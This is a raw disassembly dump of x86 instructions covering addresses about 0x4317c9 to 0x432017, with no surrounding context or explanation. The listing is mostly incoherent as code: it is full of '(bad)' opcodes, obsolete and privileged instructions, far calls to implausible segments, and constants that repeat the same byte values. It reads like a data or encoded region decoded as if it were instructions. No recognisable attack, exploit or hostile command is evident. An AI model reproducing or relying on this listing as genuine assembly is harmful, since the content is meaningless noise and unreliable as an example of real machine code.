  4317c9:	call   0x75ea7976
  4317ce:	std    
  4317cf:	xchg   ebx,eax
  4317d0:	outs   dx,BYTE PTR ds:[esi]
  4317d1:	mov    ds,WORD PTR [edi+0x61]
  4317d4:	popa   
  4317d5:	or     eax,0x130d6075
  4317da:	inc    eax
  4317db:	bound  esp,QWORD PTR [edx+0x62]
  4317de:	(bad)  
  4317df:	outs   dx,DWORD PTR ds:[esi]
  4317e0:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  4317e6:	pop    esi
  4317e7:	call   0xa5507994
  4317ec:	std    
  4317ed:	sub    eax,0x9322a74f
  4317f2:	mov    ah,0x5f
  4317f4:	pop    edi
  4317f5:	popa   
  4317f6:	popa   
  4317f7:	and    edx,esp
  4317f9:	sub    BYTE PTR [ebx+0x62],ah
  4317fc:	bound  esp,QWORD PTR [ecx+0x61]
  4317ff:	popa   
  431800:	popa   
  431801:	bound  esi,QWORD PTR [edx+0x62617024]
  431807:	mov    dl,0x24
  431809:	or     eax,0xad622475
  43180e:	or     BYTE PTR [eax+0x61],ch
  431811:	popa   
  431812:	repz dec eax
  431814:	sub    al,0x61
  431816:	popa   
  431817:	ror    BYTE PTR ds:0xdb0d2475,cl
  43181d:	and    al,0x68
  43181f:	popa   
  431820:	popa   
  431821:	bound  esi,QWORD PTR [edx-0xd]
  431824:	mov    DWORD PTR [ebx-0x32f29e9f],esp
  43182a:	and    al,0xd
  43182c:	pop    ss
  43182d:	add    DWORD PTR [eax+0x61],ebp
  431830:	popa   
  431831:	pop    ss
  431832:	push   0xb2626170
  431837:	and    al,0x13
  431839:	loop   0x4317c5
  43183b:	bound  esp,QWORD PTR [edx+0x62]
  43183e:	shl    bl,cl
  431840:	aam    0x75
  431842:	popa   
  431843:	popa   
  431844:	ror    BYTE PTR ds:0xdb0d2475,cl
  43184a:	add    DWORD PTR [eax+0x61],ebp
  43184d:	popa   
  43184e:	bound  esi,QWORD PTR [edx+0xd]
  431851:	jne    0x431877
  431853:	or     eax,0x616848db
  431858:	popa   
  431859:	(bad)  
  43185b:	call   0x6262:0x6348e217
  431862:	jo     0x4318c5
  431864:	bound  esi,QWORD PTR [edx-0x591decdc]
  43186a:	bound  esp,QWORD PTR [edx+0x62]
  43186d:	shl    bl,cl
  43186f:	dec    edx
  431870:	sub    al,0x61
  431872:	popa   
  431873:	ror    BYTE PTR ds:0xdb0d2475,cl
  431879:	add    DWORD PTR [eax+0x61],ebp
  43187c:	popa   
  43187d:	bound  esi,QWORD PTR [edx+0xd]
  431880:	jne    0x4318a6
  431882:	or     eax,0x616848db
  431887:	popa   
  431888:	(bad)  
  43188a:	call   0x6262:0x6350e217
  431891:	jo     0x4318f4
  431893:	bound  esi,QWORD PTR [edx+0x64e21324]
  431899:	arpl   WORD PTR [edx+0x62],sp
  43189c:	shl    bl,cl
  43189e:	pusha  
  43189f:	sub    al,0x61
  4318a1:	popa   
  4318a2:	ror    BYTE PTR ds:0xdb0d2475,cl
  4318a8:	add    DWORD PTR [eax+0x61],ebp
  4318ab:	popa   
  4318ac:	bound  esi,QWORD PTR [edx+0xd]
  4318af:	jne    0x4318d5
  4318b1:	or     eax,0x616848db
  4318b6:	popa   
  4318b7:	(bad)  
  4318b9:	call   0x6262:0x6318e217
  4318c0:	fcomp  DWORD PTR [ebx+0x3c]
  4318c3:	arpl   WORD PTR [edx+0x62],sp
  4318c6:	popa   
  4318c7:	fcomp  DWORD PTR [ebx+0x58]
  4318ca:	arpl   WORD PTR [edx+0x62],sp
  4318cd:	popa   
  4318ce:	out    dx,al
  4318cf:	lea    ecx,ds:0x626358e2
  4318d5:	bound  esp,QWORD PTR [edx+0x6358e217]
  4318db:	bound  esp,QWORD PTR [edx-0x28]
  4318de:	and    ebx,DWORD PTR [eax+0x63]
  4318e1:	bound  esp,QWORD PTR [edx-0x6e]
  4318e4:	jae    0x431959
  4318e6:	or     eax,0x626358e2
  4318eb:	bound  ebp,QWORD PTR [edi-0x3e658fba]
  4318f1:	dec    edx
  4318f2:	outs   dx,DWORD PTR ds:[esi]
  4318f3:	fsub   DWORD PTR [edx]
  4318f5:	test   eax,0x48e462c8
  4318fa:	arpl   WORD PTR [edx+0x62],sp
  4318fd:	loop   0x43191b
  4318ff:	out    0x87,eax
  431901:	or     eax,0x626358e2
  431906:	bound  ebp,QWORD PTR [edi-0x3e7e8fba]
  43190c:	dec    edx
  43190d:	outs   dx,DWORD PTR ds:[esi]
  43190e:	fsub   DWORD PTR [edx]
  431910:	cdq    
  431911:	enter  0xe462,0x18
  431915:	arpl   WORD PTR [edx+0x62],sp
  431918:	loop   0x431936
  43191a:	out    0x91,eax
  43191c:	fcomp  DWORD PTR [ebx+0x3c]
  43191f:	arpl   WORD PTR [edx+0x62],sp
  431922:	popa   
  431923:	out    dx,al
  431924:	cmp    DWORD PTR [eax+0x61],esi
  431927:	bound  esi,QWORD PTR [edx-0x791decdc]
  43192d:	bound  esp,QWORD PTR [edx+0x62]
  431930:	shl    bl,cl
  431932:	sahf   
  431933:	sub    al,0x61
  431935:	popa   
  431936:	ror    BYTE PTR ds:0xdb0d2475,cl
  43193c:	cmc    
  43193d:	push   0x72626161
  431942:	or     eax,0xdb0d2475
  431947:	dec    eax
  431948:	push   0xd2626161
  43194d:	call   0x6262:0x633ce217
  431954:	lock les esp,FWORD PTR [edx+0x62]
  431958:	bound  ecx,QWORD PTR ds:0x62627a0b
  43195e:	(bad)  
  43195f:	(bad)  
  431960:	dec    ebx
  431961:	or     ebx,DWORD PTR [edx-0x29c537]
  431967:	pop    esi
  431968:	call   0xe2507b15
  43196d:	inc    eax
  43196e:	bound  esp,QWORD PTR [edx+0x62]
  431971:	test   DWORD PTR [ebx],ecx
  431973:	call   0xa8e8:0x5e343ac9
  43197a:	popa   
  43197b:	shl    BYTE PTR [edx-0x4e],cl
  43197e:	and    al,0x13
  431980:	jne    0x43195d
  431982:	shl    bl,cl
  431984:	ss lahf 
  431986:	popa   
  431987:	popa   
  431988:	ror    BYTE PTR ds:0x62627ae2,cl
  43198e:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431994:	xor    al,0x5e
  431996:	call   0x63157b43
  43199b:	mov    dl,0x24
  43199d:	adc    esi,DWORD PTR [ebp+0x58]
  4319a0:	shl    bl,cl
  4319a2:	stc    
  4319a3:	lahf   
  4319a4:	popa   
  4319a5:	popa   
  4319a6:	shl    BYTE PTR [edx-0x1c],cl
  4319a9:	cmp    al,0x63
  4319ab:	bound  esp,QWORD PTR [edx-0x59]
  4319ae:	xor    DWORD PTR [edx+0x28e22190],esi
  4319b4:	arpl   WORD PTR [edx+0x62],sp
  4319b7:	push   0xd616161
  4319bc:	loop   0x4319fe
  4319be:	bound  esp,QWORD PTR [edx+0x62]
  4319c1:	test   DWORD PTR [ebx],ecx
  4319c3:	call   0x1360:0xcd0d3ac9
  4319ca:	outs   dx,BYTE PTR ds:[esi]
  4319cb:	push   0x61a8e85e
  4319d0:	pop    ss
  4319d1:	jne    0x431a33
  4319d3:	fsub   DWORD PTR [ebx]
  4319d5:	sub    BYTE PTR [ebx+0x62],ah
  4319d8:	bound  esp,QWORD PTR [ecx-0x19]
  4319db:	mov    cl,BYTE PTR ds:0x626240e2
  4319e1:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  4319e7:	or     eax,0x6e1354cd
  4319ec:	push   0x61a8e85e
  4319f1:	pop    ss
  4319f2:	jne    0x431a48
  4319f4:	lock cmp al,0x5c
  4319f7:	bound  esp,QWORD PTR [edx+0xd]
  4319fa:	jne    0x431a5c
  4319fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4319fd:	jne    0x431a53
  4319ff:	mov    dl,0x81
  431a01:	jp     0x4319b0
  431a03:	loop   0x431a06
  431a05:	imul   esp,DWORD PTR [edx-0x4e],0x5d751324
  431a0c:	shl    bl,cl
  431a0e:	cdq    
  431a0f:	jbe    0x431a72
  431a11:	popa   
  431a12:	pop    ss
  431a13:	loop   0x4319e3
  431a15:	bound  esp,QWORD PTR [edx+0x62]
  431a18:	out    dx,al
  431a19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431a1a:	or     eax,0x6262cee2
  431a1f:	bound  edx,QWORD PTR [edi]
  431a21:	loop   0x431a1c
  431a23:	pop    esp
  431a24:	bound  esp,QWORD PTR [edx+0xd]
  431a27:	loop   0x431a69
  431a29:	bound  esp,QWORD PTR [edx+0x62]
  431a2c:	test   DWORD PTR [ebx],ecx
  431a2e:	call   0xa8e8:0x5e343ac9
  431a35:	popa   
  431a36:	or     eax,0x625cf913
  431a3b:	bound  ebp,QWORD PTR [edi-0x6ecf298]
  431a41:	pop    esp
  431a42:	bound  esp,QWORD PTR [edx+0x17]
  431a45:	push   0x627ae20d
  431a4a:	bound  esp,QWORD PTR [edx-0x7b]
  431a4d:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  431a53:	call   0xe2ea7c00
  431a58:	into   
  431a59:	bound  esp,QWORD PTR [edx+0x62]
  431a5c:	xchg   ebx,eax
  431a5d:	outs   dx,BYTE PTR ds:[esi]
  431a5e:	loope  0x4319ed
  431a60:	popa   
  431a61:	popa   
  431a62:	or     eax,0x62627ae2
  431a67:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431a6d:	xor    al,0x5e
  431a6f:	call   0x75ea7c1c
  431a74:	pop    ebp
  431a75:	xchg   ebx,eax
  431a76:	outs   dx,BYTE PTR ds:[esi]
  431a77:	mov    ecx,0xd61618d
  431a7c:	loop   0x431af8
  431a7e:	bound  esp,QWORD PTR [edx+0x62]
  431a81:	test   DWORD PTR [ebx],ecx
  431a83:	call   0xa8e8:0x5e343ac9
  431a8a:	popa   
  431a8b:	pop    ss
  431a8c:	loop   0x431a96
  431a8e:	arpl   WORD PTR [edx+0x62],sp
  431a91:	out    dx,al
  431a92:	jl     0x431aa1
  431a94:	loop   0x431ad6
  431a96:	bound  esp,QWORD PTR [edx+0x62]
  431a99:	test   DWORD PTR [ebx],ecx
  431a9b:	call   0x6308:0x130d3ac9
  431aa2:	bound  esp,QWORD PTR [edx+0x13]
  431aa5:	outs   dx,BYTE PTR ds:[esi]
  431aa6:	push   0x61a8e85e
  431aab:	pop    ss
  431aac:	loop   0x431ab6
  431aae:	arpl   WORD PTR [edx+0x62],sp
  431ab1:	or     eax,0xe2a15d75
  431ab6:	or     BYTE PTR [ebx+0x62],ah
  431ab9:	bound  esi,QWORD PTR [ebx-0x7b]
  431abc:	or     eax,0x6262cee2
  431ac1:	bound  edx,QWORD PTR [esi-0x1e]
  431ac4:	or     BYTE PTR [ebx+0x62],ah
  431ac7:	bound  edx,QWORD PTR [edi]
  431ac9:	loop   0x431ae7
  431acb:	pop    esp
  431acc:	bound  esp,QWORD PTR [edx+0xd]
  431acf:	loop   0x431ad9
  431ad1:	arpl   WORD PTR [edx+0x62],sp
  431ad4:	scas   eax,DWORD PTR es:[edi]
  431ad5:	inc    esi
  431ad6:	jo     0x431ad3
  431ad8:	ror    DWORD PTR [edx+0x6f],0x98
  431adc:	or     eax,0x625c1ce2
  431ae1:	bound  edx,QWORD PTR [ebx+0x222d6106]
  431ae7:	or     eax,0x625c1c13
  431aec:	bound  eax,QWORD PTR [eax+ebp*2]
  431aef:	out    dx,al
  431af0:	add    ecx,DWORD PTR ds:0xe2175d75
  431af6:	mov    fs,WORD PTR [ebx+0x62]
  431af9:	bound  ecx,QWORD PTR ds:0x6262cee2
  431aff:	bound  edx,QWORD PTR [edi]
  431b01:	loop   0x431b3b
  431b03:	arpl   WORD PTR [edx+0x62],sp
  431b06:	and    edx,esp
  431b08:	jmp    0x431b6d
  431b0a:	bound  esp,QWORD PTR [edx-0x53]
  431b0d:	loop   0x431b10
  431b0f:	imul   esp,DWORD PTR [ecx],0x6263e6e2
  431b15:	bound  esp,QWORD PTR ds:0xd6901e2
  431b1b:	loop   0x431b08
  431b1d:	arpl   WORD PTR [edx+0x62],sp
  431b20:	test   DWORD PTR [ebx],ecx
  431b22:	call   0xa8e8:0x5e343ac9
  431b29:	popa   
  431b2a:	pop    ss
  431b2b:	loop   0x431b0c
  431b2d:	arpl   WORD PTR [edx+0x62],sp
  431b30:	or     eax,0x6263ebe2
  431b35:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431b3b:	xor    al,0x5e
  431b3d:	call   0xe25a7cea
  431b42:	jecxz  0x431ba7
  431b44:	bound  esp,QWORD PTR [edx+0x21]
  431b47:	loop   0x431b30
  431b49:	arpl   WORD PTR [edx+0x62],sp
  431b4c:	or     al,0xe2
  431b4e:	add    DWORD PTR [ecx+0x21],ebp
  431b51:	loop   0x431bcd
  431b53:	arpl   WORD PTR [edx+0x62],sp
  431b56:	daa    
  431b57:	loop   0x431b5a
  431b59:	imul   ecx,DWORD PTR ds:0x62638ee2,0xeb130d62
  431b63:	arpl   WORD PTR [edx+0x62],sp
  431b66:	(bad)  
  431b67:	outs   dx,DWORD PTR ds:[esi]
  431b68:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  431b6e:	pop    esi
  431b6f:	call   0x1fea7d1c
  431b74:	xchg   ebx,eax
  431b75:	outs   dx,BYTE PTR ds:[esi]
  431b76:	add    eax,0xd616156
  431b7b:	loop   0x431b63
  431b7d:	arpl   WORD PTR [edx+0x62],sp
  431b80:	test   DWORD PTR [ebx],ecx
  431b82:	call   0xa8e8:0x5e343ac9
  431b89:	popa   
  431b8a:	or     eax,0x6263df13
  431b8f:	bound  edx,QWORD PTR [ebx-0x1df29f46]
  431b95:	out    0x63,al
  431b97:	bound  esp,QWORD PTR [edx-0x7b]
  431b9a:	or     ebx,DWORD PTR [edx+0x5e343ac9]
  431ba0:	call   0xe4507d4d
  431ba5:	mov    fs,WORD PTR [ebx+0x62]
  431ba8:	bound  ebp,QWORD PTR ds:0x934ea758
  431bae:	mov    ah,0xc0
  431bb0:	push   esi
  431bb1:	popa   
  431bb2:	popa   
  431bb3:	or     eax,0x62638ee2
  431bb8:	bound  ecx,QWORD PTR ds:0x6263df13
  431bbe:	bound  ebp,QWORD PTR ds:0xe7130d1f
  431bc4:	arpl   WORD PTR [edx+0x62],sp
  431bc7:	(bad)  
  431bc8:	outs   dx,DWORD PTR ds:[esi]
  431bc9:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  431bcf:	pop    esi
  431bd0:	call   0x46f27d7d
  431bd5:	dec    edx
  431bd6:	outs   dx,DWORD PTR ds:[esi]
  431bd7:	pop    ss
  431bd8:	loop   0x431ba8
  431bda:	arpl   WORD PTR [edx+0x62],sp
  431bdd:	or     eax,0x6263cee2
  431be2:	bound  ecx,QWORD PTR ds:0x62637a13
  431be8:	(bad)  
  431be9:	(bad)  
  431bea:	outs   dx,DWORD PTR ds:[esi]
  431beb:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  431bf1:	pop    esi
  431bf2:	call   0x1fea7d9f
  431bf7:	lds    ebp,FWORD PTR [edx+0xd]
  431bfa:	loop   0x431c76
  431bfc:	arpl   WORD PTR [edx+0x62],sp
  431bff:	test   DWORD PTR [ebx],ecx
  431c01:	call   0xa8e8:0x5e343ac9
  431c08:	popa   
  431c09:	pop    ss
  431c0a:	loop   0x431bda
  431c0c:	arpl   WORD PTR [edx+0x62],sp
  431c0f:	or     eax,0x6263e7e2
  431c14:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431c1a:	xor    al,0x5e
  431c1c:	call   0x13507dc9
  431c21:	into   
  431c22:	arpl   WORD PTR [edx+0x62],sp
  431c25:	xchg   ebx,eax
  431c26:	mov    edx,0xe3131760
  431c2b:	arpl   WORD PTR [edx+0x62],sp
  431c2e:	or     eax,0x6263e3e2
  431c33:	bound  ecx,QWORD PTR ds:0x6263eb13
  431c39:	(bad)  
  431c3a:	(bad)  
  431c3b:	outs   dx,DWORD PTR ds:[esi]
  431c3c:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  431c42:	pop    esi
  431c43:	call   0x1fea7df0
  431c48:	xchg   ebx,eax
  431c49:	outs   dx,BYTE PTR ds:[esi]
  431c4a:	add    DWORD PTR [edi+0x61],ebx
  431c4d:	popa   
  431c4e:	or     eax,0x6263e3e2
  431c53:	bound  edx,QWORD PTR [edi]
  431c55:	loop   0x431bfd
  431c57:	arpl   WORD PTR [edx+0x62],sp
  431c5a:	or     eax,0x626338e2
  431c5f:	bound  edx,QWORD PTR [esi-0x1e]
  431c62:	fbld   TBYTE PTR [ebx+0x62]
  431c65:	bound  edx,QWORD PTR [edi]
  431c67:	loop   0x431cdb
  431c69:	arpl   WORD PTR [edx+0x62],sp
  431c6c:	and    edx,esp
  431c6e:	sub    al,0x63
  431c70:	bound  esp,QWORD PTR [edx-0x53]
  431c73:	loop   0x431c76
  431c75:	imul   esp,DWORD PTR [ecx],0x626396e2
  431c7b:	bound  esp,QWORD PTR ds:0x216901e2
  431c81:	loop   0x431c55
  431c83:	arpl   WORD PTR [edx+0x62],sp
  431c86:	mov    bl,0xe2
  431c88:	add    DWORD PTR [ecx+0x21],ebp
  431c8b:	loop   0x431c4b
  431c8d:	arpl   WORD PTR [edx+0x62],sp
  431c90:	and    esp,edx
  431c92:	add    DWORD PTR [ecx+0x21],ebp
  431c95:	loop   0x431c61
  431c97:	arpl   WORD PTR [edx+0x62],sp
  431c9a:	and    eax,0xd6901e2
  431c9f:	loop   0x431ccd
  431ca1:	arpl   WORD PTR [edx+0x62],sp
  431ca4:	test   DWORD PTR [ebx],ecx
  431ca6:	call   0xa8e8:0x5e343ac9
  431cad:	popa   
  431cae:	pop    ss
  431caf:	loop   0x431c67
  431cb1:	arpl   WORD PTR [edx+0x62],sp
  431cb4:	adc    esp,edx
  431cb6:	fisub  DWORD PTR [ebx+0x62]
  431cb9:	bound  edx,QWORD PTR [edi]
  431cbb:	loop   0x431c5f
  431cbd:	arpl   WORD PTR [edx+0x62],sp
  431cc0:	adc    esp,edx
  431cc2:	inc    eax
  431cc3:	arpl   WORD PTR [edx+0x62],sp
  431cc6:	pop    ss
  431cc7:	loop   0x431c8f
  431cc9:	arpl   WORD PTR [edx+0x62],sp
  431ccc:	or     eax,0x6263a6e2
  431cd1:	bound  esp,QWORD PTR [edi+0x6263b6e2]
  431cd7:	bound  edx,QWORD PTR [ebx+0x6168bbd8]
  431cdd:	popa   
  431cde:	or     eax,0x6263a2e2
  431ce3:	bound  esp,QWORD PTR [ecx]
  431ce5:	popa   
  431ce6:	pop    ebx
  431ce7:	loop   0x431cea
  431ce9:	imul   ecx,DWORD PTR ds:0x6263c6e2,0xb7612162
  431cf3:	loop   0x431cf6
  431cf5:	imul   edx,DWORD PTR [ebx],0x6263a7e2
  431cfb:	bound  edx,QWORD PTR [edi]
  431cfd:	loop   0x431c9d
  431cff:	arpl   WORD PTR [edx+0x62],sp
  431d02:	or     eax,0x6263cae2
  431d07:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431d0d:	xor    al,0x5e
  431d0f:	call   0x13507ebc
  431d14:	mov    dh,0x63
  431d16:	bound  esp,QWORD PTR [edx-0x6d]
  431d19:	mov    edx,0x9ee20d60
  431d1e:	arpl   WORD PTR [edx+0x62],sp
  431d21:	or     eax,0x626372e4
  431d26:	bound  ebx,QWORD PTR [edx]
  431d28:	xchg   BYTE PTR [eax-0x1df265fc],dl
  431d2e:	retf   0x6263
  431d31:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431d37:	xor    al,0x5e
  431d39:	call   0x13507ee6
  431d3e:	mov    dh,0x63
  431d40:	bound  esp,QWORD PTR [edx-0x6d]
  431d43:	mov    edx,0xd2e20d60
  431d48:	arpl   WORD PTR [edx+0x62],sp
  431d4b:	test   DWORD PTR [ebx],ecx
  431d4d:	call   0x6372:0xe2563ac9
  431d54:	bound  esp,QWORD PTR [edx-0x6d]
  431d57:	push   es
  431d58:	outs   dx,BYTE PTR ds:[esi]
  431d59:	call   0x130d:0x61a8e85e
  431d60:	fisub  DWORD PTR [ebx+0x62]
  431d63:	(bad)  
  431d64:	(bad)  
  431d65:	outs   dx,DWORD PTR ds:[esi]
  431d66:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  431d6c:	call   0x693:0x61a8e85e
  431d73:	adc    esp,DWORD PTR [edi-0x509d9d9d]
  431d79:	pusha  
  431d7a:	add    al,0x13
  431d7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431d7d:	arpl   WORD PTR [edx+0x62],sp
  431d80:	sbb    ah,dl
  431d82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431d83:	arpl   WORD PTR [edx+0x62],sp
  431d86:	or     eax,0x6263ca13
  431d8b:	(bad)  
  431d8c:	(bad)  
  431d8d:	outs   dx,DWORD PTR ds:[esi]
  431d8e:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  431d94:	pop    esi
  431d95:	call   0xe4507f42
  431d9a:	mov    dh,0x63
  431d9c:	bound  esp,QWORD PTR [edx-0x6d]
  431d9f:	mov    edx,0x72130d4f
  431da4:	arpl   WORD PTR [edx+0x62],sp
  431da7:	add    al,0xf7
  431da9:	mov    DWORD PTR ds:0x6263cae2,ecx
  431daf:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431db5:	xor    al,0x5e
  431db7:	call   0x13507f64
  431dbc:	mov    dh,0x63
  431dbe:	bound  esp,QWORD PTR [edx-0x6d]
  431dc1:	mov    edx,0x9ee20d60
  431dc6:	arpl   WORD PTR [edx+0x62],sp
  431dc9:	or     eax,0x626372e4
  431dce:	bound  ebx,QWORD PTR [edx]
  431dd0:	xchg   BYTE PTR [eax-0x1df265fc],dl
  431dd6:	retf   0x6263
  431dd9:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431ddf:	xor    al,0x5e
  431de1:	call   0x13507f8e
  431de6:	mov    dh,0x63
  431de8:	bound  esp,QWORD PTR [edx-0x6d]
  431deb:	mov    edx,0x96e20d60
  431df0:	arpl   WORD PTR [edx+0x62],sp
  431df3:	test   DWORD PTR [ebx],ecx
  431df5:	call   0x6372:0xe2563ac9
  431dfc:	bound  esp,QWORD PTR [edx-0x6d]
  431dff:	push   es
  431e00:	outs   dx,BYTE PTR ds:[esi]
  431e01:	call   0x130d:0x61a8e85e
  431e08:	inc    eax
  431e09:	arpl   WORD PTR [edx+0x62],sp
  431e0c:	(bad)  
  431e0d:	outs   dx,DWORD PTR ds:[esi]
  431e0e:	or     ebx,DWORD PTR [edx+0x6e133ac9]
  431e14:	call   0x693:0x61a8e85e
  431e1b:	adc    esp,DWORD PTR [edi-0x509d9d9d]
  431e21:	pusha  
  431e22:	add    al,0x13
  431e24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431e25:	arpl   WORD PTR [edx+0x62],sp
  431e28:	sbb    ah,dl
  431e2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431e2b:	arpl   WORD PTR [edx+0x62],sp
  431e2e:	or     eax,0x6263ca13
  431e33:	(bad)  
  431e34:	(bad)  
  431e35:	outs   dx,DWORD PTR ds:[esi]
  431e36:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  431e3c:	pop    esi
  431e3d:	call   0xe4507fea
  431e42:	mov    dh,0x63
  431e44:	bound  esp,QWORD PTR [edx-0x6d]
  431e47:	mov    edx,0x72130d4f
  431e4c:	arpl   WORD PTR [edx+0x62],sp
  431e4f:	add    al,0xf7
  431e51:	mov    DWORD PTR ds:0x626396e2,ecx
  431e57:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431e5d:	xor    al,0x5e
  431e5f:	call   0x1350800c
  431e64:	mov    esi,0xd6626263
  431e69:	outs   dx,DWORD PTR ds:[esi]
  431e6a:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  431e70:	pop    esi
  431e71:	call   0xbad6801e
  431e76:	pop    ds
  431e77:	push   esi
  431e78:	loop   0x431e30
  431e7a:	arpl   WORD PTR [edx+0x62],sp
  431e7d:	pop    ss
  431e7e:	loop   0x431e36
  431e80:	arpl   WORD PTR [edx+0x62],sp
  431e83:	lock sub al,0x63
  431e86:	bound  esp,QWORD PTR [edx+0xd]
  431e89:	loop   0x431e71
  431e8b:	arpl   WORD PTR [edx+0x62],sp
  431e8e:	test   DWORD PTR [ebx],ecx
  431e90:	call   0x632c:0x130d3ac9
  431e97:	bound  esp,QWORD PTR [edx-0x2a]
  431e9a:	outs   dx,DWORD PTR ds:[esi]
  431e9b:	or     ebx,DWORD PTR [edx+0x1fd63ac9]
  431ea1:	pop    esi
  431ea2:	call   0xe450804f
  431ea7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431ea8:	arpl   WORD PTR [edx+0x62],sp
  431eab:	or     eax,0x6263960b
  431eb0:	(bad)  
  431eb1:	(bad)  
  431eb2:	dec    ebx
  431eb3:	or     ebx,DWORD PTR [edx-0x29c537]
  431eb9:	pop    esi
  431eba:	call   0xbad68067
  431ebf:	xchg   di,ax
  431ec1:	outs   dx,DWORD PTR ds:[esi]
  431ec2:	adc    ebp,DWORD PTR [esi+0x3b]
  431ec5:	pop    esi
  431ec6:	call   0x13508073
  431ecb:	out    0x63,al
  431ecd:	bound  esp,QWORD PTR [edx-0x2a]
  431ed0:	outs   dx,DWORD PTR ds:[esi]
  431ed1:	or     ebx,DWORD PTR [edx+0x13563ac9]
  431ed7:	fbld   TBYTE PTR [ebx+0x62]
  431eda:	bound  edx,QWORD PTR [ebx]
  431edc:	outs   dx,BYTE PTR ds:[esi]
  431edd:	push   0x61a8e85e
  431ee2:	pop    ss
  431ee3:	loop   0x431ec4
  431ee5:	arpl   WORD PTR [edx+0x62],sp
  431ee8:	out    dx,al
  431ee9:	jl     0x431ef8
  431eeb:	loop   0x431ed3
  431eed:	arpl   WORD PTR [edx+0x62],sp
  431ef0:	test   DWORD PTR [ebx],ecx
  431ef2:	call   0x63df:0x130d3ac9
  431ef9:	bound  esp,QWORD PTR [edx+0x13]
  431efc:	outs   dx,BYTE PTR ds:[esi]
  431efd:	push   0x61a8e85e
  431f02:	pop    ss
  431f03:	loop   0x431ee4
  431f05:	arpl   WORD PTR [edx+0x62],sp
  431f08:	lock jno 0x431f60
  431f0b:	bound  esp,QWORD PTR [edx+0xd]
  431f0e:	loop   0x431f8a
  431f10:	bound  esp,QWORD PTR [edx+0x62]
  431f13:	test   DWORD PTR [ebx],ecx
  431f15:	call   0xa8e8:0x5e343ac9
  431f1c:	popa   
  431f1d:	pop    ss
  431f1e:	loop   0x431f6c
  431f20:	arpl   WORD PTR [edx+0x62],sp
  431f23:	bound  esi,QWORD PTR [edx-0x31f49da3]
  431f29:	bound  esp,QWORD PTR [edx+0x62]
  431f2c:	repz mov esi,0x17616175
  431f32:	loop   0x431f80
  431f34:	arpl   WORD PTR [edx+0x62],sp
  431f37:	or     eax,0xb85ad75
  431f3c:	call   0xa8e8:0x5e343ac9
  431f43:	popa   
  431f44:	ror    BYTE PTR ds:0x6262e6e2,cl
  431f4a:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431f50:	xor    al,0x5e
  431f52:	call   0x631580ff
  431f57:	or     ecx,DWORD PTR [ebx+eiz*2+0x62]
  431f5b:	bound  ecx,QWORD PTR ds:0x62627ae2
  431f61:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431f67:	xor    al,0x5e
  431f69:	call   0xe158116
  431f6e:	jne    0x431f94
  431f70:	or     eax,0x616848db
  431f75:	popa   
  431f76:	(bad)  {k7}
  431f7b:	adc    al,0x63
  431f7d:	bound  esp,QWORD PTR [edx+0xd]
  431f80:	loop   0x431ffc
  431f82:	bound  esp,QWORD PTR [edx+0x62]
  431f85:	test   DWORD PTR [ebx],ecx
  431f87:	call   0xa8e8:0x5e343ac9
  431f8e:	popa   
  431f8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431f90:	loop   0x431fa6
  431f92:	arpl   WORD PTR [edx+0x62],sp
  431f95:	out    0x40,eax
  431f97:	bound  ecx,QWORD PTR [ebx]
  431f99:	dec    esp
  431f9a:	arpl   WORD PTR [edx+0x62],sp
  431f9d:	bound  ecx,QWORD PTR [ebx]
  431f9f:	adc    al,0x63
  431fa1:	bound  esp,QWORD PTR [edx+0x62]
  431fa4:	mov    dl,0x5d
  431fa6:	bound  ecx,QWORD PTR [ebx]
  431fa8:	into   
  431fa9:	bound  esp,QWORD PTR [edx+0x62]
  431fac:	repz jle 0x431f48
  431faf:	popa   
  431fb0:	popa   
  431fb1:	or     eax,0xb851c75
  431fb6:	call   0xa8e8:0x5e343ac9
  431fbd:	popa   
  431fbe:	ror    BYTE PTR ds:0x62627ae2,cl
  431fc4:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  431fca:	xor    al,0x5e
  431fcc:	call   0x63158179
  431fd1:	or     ecx,esi
  431fd3:	bound  esp,QWORD PTR [edx+0x62]
  431fd6:	or     eax,0xdb0d2475
  431fdb:	dec    eax
  431fdc:	push   0xd2626161
  431fe1:	mov    cl,BYTE PTR ds:0x626314e2
  431fe7:	bound  edx,QWORD PTR [edi]
  431fe9:	loop   0x431fb9
  431feb:	bound  esp,QWORD PTR [edx+0x62]
  431fee:	or     eax,0x62634ce2
  431ff3:	bound  edx,QWORD PTR [edi]
  431ff5:	jne    0x432054
  431ff7:	or     eax,0x6262cee2
  431ffc:	bound  edx,QWORD PTR [edi]
  431ffe:	loop   0x432020
  432000:	arpl   WORD PTR [edx+0x62],sp
  432003:	or     eax,0x626240e2
  432008:	bound  eax,QWORD PTR [ebp+0x3ac99a0b]
  43200e:	xor    al,0x5e
  432010:	call   0xe25a81bd
  432015:	sbb    al,0x63
  432017:	bound  esp,QWORD PTR [edx-0x1]
